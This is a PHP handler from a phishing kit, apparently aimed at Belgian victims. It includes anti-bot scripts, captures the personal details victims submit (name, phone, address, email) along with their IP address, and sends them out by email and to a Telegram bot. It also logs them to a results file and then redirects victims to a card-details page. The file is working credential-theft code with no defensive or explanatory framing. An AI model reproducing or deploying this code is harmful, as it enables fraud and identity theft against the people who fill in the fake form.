<?php 
/*

             👁️👁️
 edited by : 𝚉𝙴𝙻𝙰𝙻 





*/

include '../bots/anti1.php';
include '../bots/anti2.php';
include '../bots/anti3.php';
include '../bots/anti4.php';
include '../bots/anti5.php';
include '../bots/anti6.php';
include '../bots/anti7.php';
include '../bots/anti8.php';

?>
<?php
error_reporting(0);
session_start();

include "./emaildzbi.php";
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;

$_SESSION['name'] = $final[0];
$hostname = gethostbyaddr($ip);
$message = "[=🇧🇪 Client acheter ✅ 🇧🇪=]\r\n";
$message .= "|🥶   Nom Complete    🥶 : ".$_POST['name']."\r\n";#17
$message .= "|📍 Num    📍 : ".$_POST['tel']."\r\n";
$message .= "|📍 Code Postal  📍 : ".$_POST['zip']."\r\n";
$message .= "|📍 Adress 📍 : ".$_POST['adresse']."\r\n";#17
$message .= "|📍 Ville  📍 : ".$_POST['ville']."\r\n";
$message .= "|📍 Pays  📍 : ".$_POST['pays']."\r\n";
$message .= "|🥶 Email 🥶 : ".$_POST['email']."\r\n";
$message .= "[========= $ip ========]\r\n";
$send = $email;
$subject = "♠️ (".$_POST['EMAIL'].") 🇧🇪🇧🇪 Client acheter ✅ 🇧🇪🇧🇪 $ip";
$headers = "From: [🤡🇧🇪 ZelaL 🇧🇪🤡]<info@j00keykrs.com>";
mail($send,$subject,$message,$headers);

file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
$save=fopen("../J00KEY_RESULTS.txt","a+");
fwrite($save,$message);
fclose($save);

header('Location: ./cc.php');
?>
